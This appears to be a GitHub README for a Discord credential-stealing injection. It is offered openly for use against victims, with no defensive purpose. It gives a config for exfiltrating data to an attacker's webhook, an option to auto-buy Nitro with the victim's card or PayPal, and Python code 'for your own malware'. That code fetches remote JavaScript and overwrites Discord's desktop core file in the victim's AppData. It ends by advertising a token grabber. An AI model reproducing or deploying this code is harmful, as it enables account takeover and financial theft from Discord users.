## üöÄ„ÉªConfigure Discord Injection!

You'll need [Git](https://git-scm.com) to start off!

```sh-session
git@2.17.1 or higher
```

### 1. From your command line, clone and configure discord-injection:

```bash
# Clone this repository
$ git clone https://github.com/rdimo/Discord-injection.git

```

Copy the raw url of the [injection](./injection.js) and then paste it in your code

[forking](https://github.com/Rdimo/Discord-injection/fork) this repo is also a viable way but make sure to go into the code and change the config to your preferences! ‚á£‚á£‚á£

```javascript
const config = {
    webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
    auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account or tries to buy nitro themselves
    ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
    ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
    embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
    embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info
    embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
    injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects

    ... //rest of the config you should NOT touch
};
```

## üéà„ÉªCode example

Example of how you can implement this injection into your own malware

```py
import os
import re
import requests
webhook = 'https://discord.com/apwebhooks/123456789/abcdefghijklmnopqrstuvwxyz'

def inject():
    for _dir in os.listdir(os.getenv('localappdata')):
        if 'discord' in _dir.lower():
            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
                if re.match(r'app-(\d*\.\d*)*', __dir):
                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
                    with open(abspath+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                        indexFile.write(f)
                    os.startfile(abspath+os.sep+_dir+'.exe')

if __name__ == "__main__":
    inject()
```

## üë¥„ÉªWant to use it but don't know shit about coding?

No worries, [Hazard-Token-Grabber-V2](https://github.com/Rdimo/Hazard-Token-Grabber-V2) is a stealer that uses this injection + steals more!
